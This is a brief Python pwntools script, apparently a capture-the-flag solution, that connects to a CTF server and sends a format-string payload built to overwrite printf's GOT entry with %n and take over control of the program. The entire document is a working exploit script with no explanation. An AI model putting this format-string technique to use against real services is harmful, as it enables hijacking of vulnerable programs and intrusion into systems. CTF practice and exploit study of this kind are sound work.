from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3002)
printf_got = 0x804a00c

payload = p32(printf_got) + b'%134514096x' + b'%n'

print(payload)
r.sendline(payload)

r.interactive()